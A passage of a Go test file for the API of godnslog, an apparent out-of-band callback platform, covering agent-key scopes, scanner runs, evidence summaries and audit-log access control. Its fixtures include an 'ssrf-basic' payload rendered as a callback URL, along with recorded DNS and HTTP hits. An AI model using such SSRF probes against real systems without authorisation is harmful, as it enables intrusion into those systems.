package server

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/chennqqi/godnslog/cache"
	"github.com/chennqqi/godnslog/internal/agentpolicy"
	"github.com/chennqqi/godnslog/internal/evidencehub"
	"github.com/chennqqi/godnslog/internal/ha"
	"github.com/chennqqi/godnslog/internal/interaction"
	"github.com/chennqqi/godnslog/internal/marketplace"
	v2models "github.com/chennqqi/godnslog/internal/models"
	"github.com/chennqqi/godnslog/internal/payload"
	"github.com/chennqqi/godnslog/models"
	"github.com/gin-gonic/gin"
	"golang.org/x/crypto/bcrypt"
)

// Helper function to create string pointer
func strPtr(s string) *string {
	return &s
}

func TestV2AgentPolicyScopes(t *testing.T) {
	gin.SetMode(gin.TestMode)

	_, r, token := setupV2ScannerHubAPITest(t)

	req := httptest.NewRequest(http.MethodGet, "/api/v2/agent-policy/scopes", nil)
	req.Header.Set("Access-Token", token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp struct {
		Code int                      `json:"code"`
		Data agentpolicy.ScopeCatalog `json:"data"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("failed to parse response: %v", err)
	}
	if resp.Code != 0 {
		t.Fatalf("expected code 0, got %d", resp.Code)
	}
	if !containsString(resp.Data.DefaultScopes, "agent:create_probe") {
		t.Fatalf("expected create_probe in default scopes: %#v", resp.Data.DefaultScopes)
	}
	if containsString(resp.Data.DefaultScopes, "agent:revoke_token") {
		t.Fatalf("default scopes must not include revoke_token: %#v", resp.Data.DefaultScopes)
	}
	if !containsString(resp.Data.HighRiskScopes, "agent:delete_payload") {
		t.Fatalf("expected delete_payload in high-risk scopes: %#v", resp.Data.HighRiskScopes)
	}
	if _, ok := resp.Data.ByScope()["agent:modify_config"]; !ok {
		t.Fatal("expected modify_config in policy items")
	}
}

func TestV2CreateAgentAPIKeyUsesSafeDefaults(t *testing.T) {
	gin.SetMode(gin.TestMode)

	_, r, token := setupV2ScannerHubAPITest(t)

	body := strings.NewReader(`{"name":"agent-default","scopes":[],"is_agent":true}`)
	req := httptest.NewRequest(http.MethodPost, "/api/v2/apikeys", body)
	req.Header.Set("Access-Token", token)
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp struct {
		Code int             `json:"code"`
		Data v2models.APIKey `json:"data"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("failed to parse response: %v", err)
	}
	if resp.Code != 0 {
		t.Fatalf("expected code 0, got %d", resp.Code)
	}
	if !resp.Data.IsAgent {
		t.Fatal("expected created key to be agent key")
	}
	if resp.Data.RiskTolerance != "medium" {
		t.Fatalf("expected default risk tolerance medium, got %q", resp.Data.RiskTolerance)
	}
	for _, scope := range agentpolicy.DefaultScopes() {
		if !containsString([]string(resp.Data.Scopes), scope) {
			t.Fatalf("expected default scope %q in created key scopes %#v", scope, resp.Data.Scopes)
		}
	}
	for _, scope := range agentpolicy.HighRiskScopes() {
		if containsString([]string(resp.Data.Scopes), scope) {
			t.Fatalf("high-risk scope %q must not be granted by default: %#v", scope, resp.Data.Scopes)
		}
	}
	if resp.Data.ExpiresAt == nil {
		t.Fatal("expected agent key default expiration")
	}
}

func TestV2EvidenceSummaryWithScannerRun(t *testing.T) {
	gin.SetMode(gin.TestMode)

	server, r, token := setupV2ScannerHubAPITest(t)
	scannerRunID := createV2ScannerRunForSummary(t, r, token)
	seedV2SummaryInteractions(t, server)

	body := strings.NewReader(fmt.Sprintf(`{"scanner_run_id":%q}`, scannerRunID))
	req := httptest.NewRequest(http.MethodPost, "/api/v2/evidence/summary", body)
	req.Header.Set("Access-Token", token)
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp struct {
		Code int                         `json:"code"`
		Data evidencehub.SummaryResponse `json:"data"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("failed to parse response: %v", err)
	}
	if resp.Code != 0 {
		t.Fatalf("expected code 0, got %d", resp.Code)
	}
	if resp.Data.Scope.ScannerRunID != scannerRunID {
		t.Fatalf("expected scanner_run_id %q, got %q", scannerRunID, resp.Data.Scope.ScannerRunID)
	}
	if resp.Data.Scope.CaseID != "case-scanner-1" {
		t.Fatalf("expected case scope, got %#v", resp.Data.Scope)
	}
	if resp.Data.Scope.PayloadID != "payload-scanner-1" {
		t.Fatalf("expected payload scope, got %#v", resp.Data.Scope)
	}
	if resp.Data.Evidence == nil || resp.Data.Evidence.InteractionCount != 2 {
		t.Fatalf("expected evidence with 2 interactions, got %#v", resp.Data.Evidence)
	}
	if len(resp.Data.ScannerRuns) != 1 {
		t.Fatalf("expected one scanner run, got %d", len(resp.Data.ScannerRuns))
	}
	if len(resp.Data.PackageHashes) != 1 || resp.Data.PackageHashes[0] == "" {
		t.Fatalf("expected package hashes, got %#v", resp.Data.PackageHashes)
	}
	if resp.Data.SummaryHash == "" {
		t.Fatal("expected summary hash")
	}
	if len(resp.Data.NextActions) == 0 {
		t.Fatal("expected next actions")
	}
}

func createV2ScannerRunForSummary(t *testing.T, r *gin.Engine, token string) string {
	t.Helper()

	body := strings.NewReader(`{
		"case_id":"case-scanner-1",
		"payload_id":"payload-scanner-1",
		"scanner":"burp",
		"target":"https://target.example",
		"template":"ssrf-basic",
		"delivery_method":"burp-extension"
	}`)
	req := httptest.NewRequest(http.MethodPost, "/api/v2/scanner-runs", body)
	req.Header.Set("Access-Token", token)
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("failed to create scanner run: %d %s", w.Code, w.Body.String())
	}
	var resp struct {
		Data v2models.ScannerRun `json:"data"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("failed to parse scanner run response: %v", err)
	}
	if resp.Data.ID == "" {
		t.Fatal("expected scanner run id")
	}
	return resp.Data.ID
}

func seedV2SummaryInteractions(t *testing.T, server *WebServer) {
	t.Helper()

	caseID := "case-scanner-1"
	payloadID := "payload-scanner-1"
	token := "tok-scanner-api"
	domain := "tok-scanner-api.example.com"
	method := "GET"
	path := "/callback"
	now := time.Now().UTC()
	interactions := []v2models.Interaction{
		{
			ID:        "summary-interaction-1",
			Type:      v2models.InteractionTypeDNS,
			CaseID:    &caseID,
			PayloadID: &payloadID,
			Token:     &token,
			Timestamp: now,
			SourceIP:  "198.51.100.20",
			Domain:    &domain,
			RawData:   "dns callback",
			CreatedAt: now,
		},
		{
			ID:        "summary-interaction-2",
			Type:      v2models.InteractionTypeHTTP,
			CaseID:    &caseID,
			PayloadID: &payloadID,
			Token:     &token,
			Timestamp: now.Add(time.Minute),
			SourceIP:  "198.51.100.21",
			Method:    &method,
			Path:      &path,
			RawData:   "http callback",
			CreatedAt: now.Add(time.Minute),
		},
	}
	if _, err := server.orm.Insert(&interactions); err != nil {
		t.Fatalf("failed to seed interactions: %v", err)
	}
}

func containsString(values []string, value string) bool {
	for _, item := range values {
		if item == value {
			return true
		}
	}
	return false
}

func setupV2ScannerHubAPITest(t *testing.T) (*WebServer, *gin.Engine, string) {
	t.Helper()

	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}
	store := cache.NewCache(300, 60)
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("failed to create server: %v", err)
	}
	if err := server.initDatabase(); err != nil {
		t.Fatalf("failed to initialize database: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.Case), new(v2models.Payload), new(v2models.ScannerRun), new(v2models.AuditLog)); err != nil {
		t.Fatalf("failed to sync v2 scanner hub schema: %v", err)
	}
	if err := server.orm.Sync2(new(ha.ClusterNode), new(ha.ClusterConfig), new(ha.HealthCheck)); err != nil {
		t.Fatalf("failed to sync HA schema: %v", err)
	}

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte("password"), bcrypt.DefaultCost)
	if err != nil {
		t.Fatalf("failed to hash password: %v", err)
	}
	user := &models.TblUser{
		Name:  "scanneruser",
		Email: "scanneruser@test.com",
		Pass:  string(hashedPassword),
		Role:  0,
		Lang:  "en-US",
	}
	if _, err := server.orm.Insert(user); err != nil {
		t.Fatalf("failed to create user: %v", err)
	}

	r := gin.New()
	server.registerV2API(r)

	loginReq := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(`{"username":"scanneruser","password":"password"}`))
	loginReq.Header.Set("Content-Type", "application/json")
	loginW := httptest.NewRecorder()
	r.ServeHTTP(loginW, loginReq)
	if loginW.Code != http.StatusOK {
		t.Fatalf("login failed with status %d: %s", loginW.Code, loginW.Body.String())
	}
	var loginResp struct {
		Data struct {
			Token string `json:"token"`
		} `json:"data"`
	}
	if err := json.Unmarshal(loginW.Body.Bytes(), &loginResp); err != nil {
		t.Fatalf("failed to parse login response: %v", err)
	}
	if loginResp.Data.Token == "" {
		t.Fatal("expected login token")
	}

	parts := strings.Split(loginResp.Data.Token, ".")
	if len(parts) != 3 {
		t.Fatal("invalid jwt token format")
	}
	decoded, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		t.Fatalf("failed to decode jwt payload: %v", err)
	}
	var claims map[string]interface{}
	if err := json.Unmarshal(decoded, &claims); err != nil {
		t.Fatalf("failed to parse jwt claims: %v", err)
	}
	seed, ok := claims["seed"].(string)
	if !ok || seed == "" {
		t.Fatalf("expected string seed claim, got %#v", claims["seed"])
	}
	store.Set(fmt.Sprintf("%v.seed", user.Id), seed, cache.NoExpiration)
	store.Set(fmt.Sprintf("%v.user", user.Id), user, cache.NoExpiration)

	caseID := "case-scanner-1"
	payloadID := "payload-scanner-1"
	now := time.Now()
	caseItem := &v2models.Case{
		ID:        caseID,
		Title:     "Scanner Hub API Case",
		Status:    "active",
		CreatedBy: fmt.Sprintf("%d", user.Id),
		CreatedAt: now,
		UpdatedAt: now,
	}
	if _, err := server.orm.Insert(caseItem); err != nil {
		t.Fatalf("failed to create case: %v", err)
	}
	payloadItem := &v2models.Payload{
		ID:               payloadID,
		CaseID:           caseID,
		Token:            "tok-scanner-api",
		TemplateID:       "ssrf-basic",
		TemplateRendered: "http://tok-scanner-api.example.com/callback",
		Variables:        v2models.Variables{},
		Status:           "active",
		CreatedBy:        fmt.Sprintf("%d", user.Id),
		CreatedAt:        now,
		UpdatedAt:        now,
	}
	if _, err := server.orm.Insert(payloadItem); err != nil {
		t.Fatalf("failed to create payload: %v", err)
	}

	return server, r, loginResp.Data.Token
}

func TestV2RoutesExposeRequiredMVPPaths(t *testing.T) {
	gin.SetMode(gin.TestMode)

	r := gin.New()
	server := &WebServer{}
	server.registerV2API(r)

	routes := make(map[string]struct{}, len(r.Routes()))
	for _, route := range r.Routes() {
		routes[route.Method+" "+route.Path] = struct{}{}
	}

	requiredRoutes := []string{
		"GET /api/v2/cases/:id/payloads",
		"GET /api/v2/cases/:id/interactions",
		"PUT /api/v2/payloads/:id",
		"GET /api/v2/interactions/stats",
		"POST /api/v2/evidence/generate",
		"GET /api/v2/audit/logs",
		"GET /api/v2/scanner-hub/adapters",
	}

	for _, route := range requiredRoutes {
		if _, ok := routes[route]; !ok {
			t.Fatalf("expected route %q to be registered, but it was missing", route)
		}
	}
}

func TestV2ScannerAdapters(t *testing.T) {
	gin.SetMode(gin.TestMode)
	_, r, token := setupV2ScannerHubAPITest(t)

	req := httptest.NewRequest("GET", "/api/v2/scanner-hub/adapters", nil)
	req.Header.Set("Access-Token", token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp struct {
		Code int `json:"code"`
		Data struct {
			Items []v2models.ScannerAdapter `json:"items"`
		} `json:"data"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("failed to parse response: %v", err)
	}
	if resp.Code != 0 {
		t.Fatalf("expected code 0, got %d", resp.Code)
	}
	byID := map[string]bool{}
	for _, adapter := range resp.Data.Items {
		byID[adapter.ID] = true
	}
	for _, scanner := range []string{
		v2models.ScannerBurp,
		v2models.ScannerYakit,
		v2models.ScannerZap,
		v2models.ScannerXray,
		v2models.ScannerRad,
		v2models.ScannerPostman,
		v2models.ScannerApifox,
	} {
		if !byID[scanner] {
			t.Fatalf("expected scanner adapter %s", scanner)
		}
	}
}

func TestV2CreateScannerRunSupportsBurpAndRejectsWrongDelivery(t *testing.T) {
	gin.SetMode(gin.TestMode)
	_, r, token := setupV2ScannerHubAPITest(t)

	body := `{
		"case_id":"case-scanner-1",
		"payload_id":"payload-scanner-1",
		"scanner":"burp",
		"target":"https://target.example",
		"template":"ssrf-basic",
		"delivery_method":"burp-extension"
	}`
	req := httptest.NewRequest("POST", "/api/v2/scanner-runs", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Access-Token", token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp struct {
		Code int                 `json:"code"`
		Data v2models.ScannerRun `json:"data"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("failed to parse response: %v", err)
	}
	if resp.Data.Scanner != v2models.ScannerBurp {
		t.Fatalf("expected burp scanner, got %s", resp.Data.Scanner)
	}
	if resp.Data.DeliveryMethod != v2models.DeliveryMethodBurpExtension {
		t.Fatalf("expected burp delivery, got %s", resp.Data.DeliveryMethod)
	}
	if !strings.Contains(resp.Data.Command, "Burp Suite Extension") {
		t.Fatalf("expected burp package command, got %s", resp.Data.Command)
	}
	if resp.Data.PackageHash == "" {
		t.Fatal("expected package hash in scanner run response")
	}
	if resp.Data.PackageManifest.SchemaVersion != "scanner-package.v1" {
		t.Fatalf("expected scanner-package.v1 manifest, got %q", resp.Data.PackageManifest.SchemaVersion)
	}
	if resp.Data.PackageManifest.PackageHash != resp.Data.PackageHash {
		t.Fatalf("expected manifest hash %q, got %q", resp.Data.PackageHash, resp.Data.PackageManifest.PackageHash)
	}
	if !scannerManifestHasFile(resp.Data.PackageManifest, "burp-extension-config.json") {
		t.Fatalf("expected burp extension config in manifest: %#v", resp.Data.PackageManifest.Files)
	}

	invalidBody := strings.Replace(body, `"burp-extension"`, `"nuclei-jsonl"`, 1)
	invalidReq := httptest.NewRequest("POST", "/api/v2/scanner-runs", strings.NewReader(invalidBody))
	invalidReq.Header.Set("Content-Type", "application/json")
	invalidReq.Header.Set("Access-Token", token)
	invalidW := httptest.NewRecorder()
	r.ServeHTTP(invalidW, invalidReq)
	if invalidW.Code != http.StatusBadRequest {
		t.Fatalf("expected status 400 for invalid delivery, got %d: %s", invalidW.Code, invalidW.Body.String())
	}
}

func scannerManifestHasFile(manifest v2models.ScannerPackageManifest, name string) bool {
	for _, file := range manifest.Files {
		if file.Name == name {
			return true
		}
	}
	return false
}

func TestV2ListAuditLogs(t *testing.T) {
	gin.SetMode(gin.TestMode)

	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	store := cache.NewCache(300, 60)
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}

	if err := server.initDatabase(); err != nil {
		t.Fatalf("Failed to initialize database: %v", err)
	}

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte("password"), bcrypt.DefaultCost)
	if err != nil {
		t.Fatalf("Failed to hash password: %v", err)
	}

	user := &models.TblUser{
		Name:  "testuser",
		Email: "testuser@test.com",
		Pass:  string(hashedPassword),
		Role:  0,
		Lang:  "en-US",
	}
	if _, err := server.orm.Insert(user); err != nil {
		t.Fatalf("Failed to create test user: %v", err)
	}

	// Create a test audit log
	userIDStr := fmt.Sprintf("%d", user.Id)
	auditLog := &v2models.AuditLog{
		ID:           v2models.GenerateID(),
		UserID:       &userIDStr,
		Action:       "create_case",
		ResourceType: "case",
		Parameters:   `{"title":"test case"}`,
		Result:       "success",
		IPAddress:    "127.0.0.1",
		UserAgent:    "test-agent",
		Timestamp:    time.Now(),
	}
	if _, err := server.orm.Insert(auditLog); err != nil {
		t.Fatalf("Failed to create test audit log: %v", err)
	}

	// Create another audit log with different resource_id using direct SQL
	// This ensures the resource_id column is correctly populated
	resourceID1 := "case-123"
	resourceID2 := "case-456"

	// Insert audit log with resource_id=case-123
	_, err = server.orm.Exec(`
		INSERT INTO audit_logs (id, user_id, action, resource_type, resource_id, parameters, result, ip_address, user_agent, is_agent, timestamp, created_at)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 0, datetime('now'), datetime('now'))
	`, v2models.GenerateID(), userIDStr, "create_case", "case", resourceID1, `{"title":"test case 123"}`, "success", "127.0.0.1", "test-agent")
	if err != nil {
		t.Fatalf("Failed to create audit log with resource_id=case-123: %v", err)
	}

	// Insert audit log with resource_id=case-456
	_, err = server.orm.Exec(`
		INSERT INTO audit_logs (id, user_id, action, resource_type, resource_id, parameters, result, ip_address, user_agent, is_agent, timestamp, created_at)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 0, datetime('now'), datetime('now'))
	`, v2models.GenerateID(), userIDStr, "create_case", "case", resourceID2, `{"title":"test case 456"}`, "success", "127.0.0.1", "test-agent")
	if err != nil {
		t.Fatalf("Failed to create audit log with resource_id=case-456: %v", err)
	}

	r := gin.New()
	server.registerV2API(r)

	loginReq := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(`{"username":"testuser","password":"password"}`))
	loginReq.Header.Set("Content-Type", "application/json")
	loginW := httptest.NewRecorder()
	r.ServeHTTP(loginW, loginReq)

	type LoginResponse struct {
		Code    int    `json:"code"`
		Message string `json:"message"`
		Data    struct {
			Token string `json:"token"`
		} `json:"data"`
	}
	var loginResp LoginResponse
	if err := json.Unmarshal(loginW.Body.Bytes(), &loginResp); err != nil {
		t.Fatalf("Failed to unmarshal login response: %v", err)
	}
	token := loginResp.Data.Token

	// Extract seed from JWT and set user in cache
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		t.Fatal("Invalid JWT token format")
	}
	decoded, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		t.Fatalf("Failed to decode JWT payload: %v", err)
	}
	var claims map[string]interface{}
	if err := json.Unmarshal(decoded, &claims); err != nil {
		t.Fatalf("Failed to unmarshal JWT claims: %v", err)
	}
	seedValue := claims["seed"]
	var seedStr string
	switch v := seedValue.(type) {
	case float64:
		seedStr = fmt.Sprintf("%.0f", v)
	case string:
		seedStr = v
	default:
		t.Fatalf("Unexpected seed type: %T, value: %v", seedValue, seedValue)
	}
	seedKey := fmt.Sprintf("%v.seed", user.Id)
	userKey := fmt.Sprintf("%v.user", user.Id)
	store.Set(seedKey, seedStr, cache.NoExpiration)
	store.Set(userKey, user, cache.NoExpiration)

	// Test successful audit logs list
	auditReq := httptest.NewRequest("GET", "/api/v2/audit/logs?page=1&page_size=10", nil)
	auditReq.Header.Set("Access-Token", token)
	auditW := httptest.NewRecorder()
	r.ServeHTTP(auditW, auditReq)

	if auditW.Code != http.StatusOK {
		t.Fatalf("Expected status 200, got %d: %s", auditW.Code, auditW.Body.String())
	}

	var response map[string]interface{}
	if err := json.Unmarshal(auditW.Body.Bytes(), &response); err != nil {
		t.Fatalf("Failed to unmarshal response: %v", err)
	}
	if response["code"].(float64) != 0 {
		t.Errorf("Expected code 0, got %v", response["code"])
	}

	// Verify data structure
	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatal("Expected data to be a map")
	}
	if data["items"] == nil {
		t.Error("Expected items field in data")
	}
	if data["total"] == nil {
		t.Error("Expected total field in data")
	}
	if data["page"] == nil {
		t.Error("Expected page field in data")
	}
	if data["page_size"] == nil {
		t.Error("Expected page_size field in data")
	}
	if data["total_pages"] == nil {
		t.Error("Expected total_pages field in data")
	}

	// Test filtering by action
	auditReq2 := httptest.NewRequest("GET", "/api/v2/audit/logs?action=create_case", nil)
	auditReq2.Header.Set("Access-Token", token)
	auditW2 := httptest.NewRecorder()
	r.ServeHTTP(auditW2, auditReq2)

	if auditW2.Code != http.StatusOK {
		t.Fatalf("Expected status 200 for filtered request, got %d: %s", auditW2.Code, auditW2.Body.String())
	}

	// Test filtering by resource_type
	auditReq3 := httptest.NewRequest("GET", "/api/v2/audit/logs?resource_type=case", nil)
	auditReq3.Header.Set("Access-Token", token)
	auditW3 := httptest.NewRecorder()
	r.ServeHTTP(auditW3, auditReq3)

	if auditW3.Code != http.StatusOK {
		t.Fatalf("Expected status 200 for resource_type filter, got %d: %s", auditW3.Code, auditW3.Body.String())
	}

	// Test filtering by resource_id=case-123 should return only case-123, not case-456
	// Use API call to verify the filter works correctly
	auditReq4 := httptest.NewRequest("GET", "/api/v2/audit/logs?resource_id=case-123", nil)
	auditReq4.Header.Set("Access-Token", token)
	auditW4 := httptest.NewRecorder()
	r.ServeHTTP(auditW4, auditReq4)

	if auditW4.Code != http.StatusOK {
		t.Fatalf("Expected status 200 for resource_id=case-123 filter, got %d: %s", auditW4.Code, auditW4.Body.String())
	}

	var response4 map[string]interface{}
	if err := json.Unmarshal(auditW4.Body.Bytes(), &response4); err != nil {
		t.Fatalf("Failed to unmarshal resource_id=case-123 filter response: %v", err)
	}
	data4, ok := response4["data"].(map[string]interface{})
	if !ok {
		t.Fatal("Expected data to be a map for resource_id=case-123 filter")
	}
	items4, ok := data4["items"].([]interface{})
	if !ok {
		t.Fatal("Expected items to be an array for resource_id=case-123 filter")
	}
	// Should return at least 1 item (the one with resource_id=case-123)
	if len(items4) < 1 {
		t.Errorf("Expected at least 1 item for resource_id=case-123 filter, got %d", len(items4))
	}
	// Verify all returned items have resource_id=case-123
	for _, item := range items4 {
		itemMap := item.(map[string]interface{})
		resourceID, ok := itemMap["resource_id"].(string)
		if !ok || resourceID != "case-123" {
			t.Errorf("Expected all items to have resource_id=case-123, got %v", itemMap["resource_id"])
		}
	}

	// Test filtering by resource_id=case-456 should return only case-456, not case-123
	auditReq5 := httptest.NewRequest("GET", "/api/v2/audit/logs?resource_id=case-456", nil)
	auditReq5.Header.Set("Access-Token", token)
	auditW5 := httptest.NewRecorder()
	r.ServeHTTP(auditW5, auditReq5)

	if auditW5.Code != http.StatusOK {
		t.Fatalf("Expected status 200 for resource_id=case-456 filter, got %d: %s", auditW5.Code, auditW5.Body.String())
	}

	var response5 map[string]interface{}
	if err := json.Unmarshal(auditW5.Body.Bytes(), &response5); err != nil {
		t.Fatalf("Failed to unmarshal resource_id=case-456 filter response: %v", err)
	}
	data5, ok := response5["data"].(map[string]interface{})
	if !ok {
		t.Fatal("Expected data to be a map for resource_id=case-456 filter")
	}
	items5, ok := data5["items"].([]interface{})
	if !ok {
		t.Fatal("Expected items to be an array for resource_id=case-456 filter")
	}
	// Should return at least 1 item (the one with resource_id=case-456)
	if len(items5) < 1 {
		t.Errorf("Expected at least 1 item for resource_id=case-456 filter, got %d", len(items5))
	}
	// Verify all returned items have resource_id=case-456
	for _, item := range items5 {
		itemMap := item.(map[string]interface{})
		resourceID, ok := itemMap["resource_id"].(string)
		if !ok || resourceID != "case-456" {
			t.Errorf("Expected all items to have resource_id=case-456, got %v", itemMap["resource_id"])
		}
	}

	// Verify that resource_id=case-123 does not return case-456
	// Get all items from case-123 filter and check none have resource_id=case-456
	for _, item := range items4 {
		itemMap := item.(map[string]interface{})
		resourceID, _ := itemMap["resource_id"].(string)
		if resourceID == "case-456" {
			t.Errorf("resource_id=case-123 filter should not return case-456 records")
		}
	}

	// Test unauthenticated access
	auditReq6 := httptest.NewRequest("GET", "/api/v2/audit/logs", nil)
	auditW6 := httptest.NewRecorder()
	r.ServeHTTP(auditW6, auditReq6)

	if auditW6.Code != http.StatusUnauthorized {
		t.Errorf("Expected status 401 for unauthenticated request, got %d", auditW6.Code)
	}

	// Test RBAC: normal user can only see own logs
	normalUser := &models.TblUser{
		Name:    "normaluser",
		Email:   "normal@test.com",
		Pass:    string(hashedPassword),
		Role:    2, // roleNormal
		Lang:    "en-US",
		ShortId: fmt.Sprintf("short-%d", time.Now().UnixNano()),
		Token:   fmt.Sprintf("token-%d", time.Now().UnixNano()),
	}
	if _, err := server.orm.Insert(normalUser); err != nil {
		t.Fatalf("Failed to create normal user: %v", err)
	}

	// Create an audit log for the normal user
	normalUserIDStr := fmt.Sprintf("%d", normalUser.Id)
	normalAuditLog := &v2models.AuditLog{
		ID:           v2models.GenerateID(),
		UserID:       &normalUserIDStr,
		Action:       "view_dashboard",
		ResourceType: "dashboard",
		Result:       "success",
		IPAddress:    "127.0.0.1",
		UserAgent:    "test-agent",
		Timestamp:    time.Now(),
	}
	if _, err := server.orm.Insert(normalAuditLog); err != nil {
		t.Fatalf("Failed to create audit log for normal user: %v", err)
	}

	normalLoginReq := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(`{"username":"normaluser","password":"password"}`))
	normalLoginReq.Header.Set("Content-Type", "application/json")
	normalLoginW := httptest.NewRecorder()
	r.ServeHTTP(normalLoginW, normalLoginReq)

	var normalLoginResp LoginResponse
	if err := json.Unmarshal(normalLoginW.Body.Bytes(), &normalLoginResp); err != nil {
		t.Fatalf("Failed to unmarshal normal user login response: %v", err)
	}
	normalToken := normalLoginResp.Data.Token

	// Extract seed from JWT and set normal user in cache
	normalParts := strings.Split(normalToken, ".")
	if len(normalParts) != 3 {
		t.Fatal("Invalid JWT token format for normal user")
	}
	normalDecoded, err := base64.RawURLEncoding.DecodeString(normalParts[1])
	if err != nil {
		t.Fatalf("Failed to decode JWT payload for normal user: %v", err)
	}
	var normalClaims map[string]interface{}
	if err := json.Unmarshal(normalDecoded, &normalClaims); err != nil {
		t.Fatalf("Failed to unmarshal JWT claims for normal user: %v", err)
	}
	normalSeedValue := normalClaims["seed"]
	var normalSeedStr string
	switch v := normalSeedValue.(type) {
	case float64:
		normalSeedStr = fmt.Sprintf("%.0f", v)
	case string:
		normalSeedStr = v
	default:
		t.Fatalf("Unexpected seed type: %T, value: %v", normalSeedValue, normalSeedValue)
	}
	normalSeedKey := fmt.Sprintf("%v.seed", normalUser.Id)
	normalUserKey := fmt.Sprintf("%v.user", normalUser.Id)
	store.Set(normalSeedKey, normalSeedStr, cache.NoExpiration)
	store.Set(normalUserKey, normalUser, cache.NoExpiration)

	// Normal user should only see their own logs
	normalAuditReq := httptest.NewRequest("GET", "/api/v2/audit/logs?page=1&page_size=10", nil)
	normalAuditReq.Header.Set("Access-Token", normalToken)
	normalAuditW := httptest.NewRecorder()
	r.ServeHTTP(normalAuditW, normalAuditReq)

	if normalAuditW.Code != http.StatusOK {
		t.Fatalf("Expected status 200 for normal user, got %d: %s", normalAuditW.Code, normalAuditW.Body.String())
	}

	var normalResponse map[string]interface{}
	if err := json.Unmarshal(normalAuditW.Body.Bytes(), &normalResponse); err != nil {
		t.Fatalf("Failed to unmarshal normal user response: %v", err)
	}
	normalData, ok := normalResponse["data"].(map[string]interface{})
	if !ok {
		t.Fatal("Expected data to be a map for normal user")
	}
	// Normal user may have no audit logs, so items could be nil/empty
	normalItems, _ := normalData["items"].([]interface{})
	// All returned items (if any) should belong to the normal user
	for _, item := range normalItems {
		itemMap := item.(map[string]interface{})
		itemUserID, _ := itemMap["user_id"].(string)
		if itemUserID != normalUserIDStr {
			t.Errorf("Normal user should only see own logs, got user_id=%v", itemMap["user_id"])
		}
	}

	// Test RBAC: guest user is denied access
	guestUser := &models.TblUser{
		Name:    "guestuser",
		Email:   "guest@test.com",
		Pass:    string(hashedPassword),
		Role:    3, // roleGuest
		Lang:    "en-US",
		ShortId: fmt.Sprintf("short-g-%d", time.Now().UnixNano()),
		Token:   fmt.Sprintf("token-g-%d", time.Now().UnixNano()),
	}
	if _, err := server.orm.Insert(guestUser); err != nil {
		t.Fatalf("Failed to create guest user: %v", err)
	}

	guestLoginReq := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(`{"username":"guestuser","password":"password"}`))
	guestLoginReq.Header.Set("Content-Type", "application/json")
	guestLoginW := httptest.NewRecorder()
	r.ServeHTTP(guestLoginW, guestLoginReq)

	var guestLoginResp LoginResponse
	if err := json.Unmarshal(guestLoginW.Body.Bytes(), &guestLoginResp); err != nil {
		t.Fatalf("Failed to unmarshal guest user login response: %v", err)
	}
	guestToken := guestLoginResp.Data.Token

	// Extract seed from JWT and set guest user in cache
	guestParts := strings.Split(guestToken, ".")
	if len(guestParts) != 3 {
		t.Fatal("Invalid JWT token format for guest user")
	}
	guestDecoded, err := base64.RawURLEncoding.DecodeString(guestParts[1])
	if err != nil {
		t.Fatalf("Failed to decode JWT payload for guest user: %v", err)
	}
	var guestClaims map[string]interface{}
	if err := json.Unmarshal(guestDecoded, &guestClaims); err != nil {
		t.Fatalf("Failed to unmarshal JWT claims for guest user: %v", err)
	}
	guestSeedValue := guestClaims["seed"]
	var guestSeedStr string
	switch v := guestSeedValue.(type) {
	case float64:
		guestSeedStr = fmt.Sprintf("%.0f", v)
	case string:
		guestSeedStr = v
	default:
		t.Fatalf("Unexpected seed type: %T, value: %v", guestSeedValue, guestSeedValue)
	}
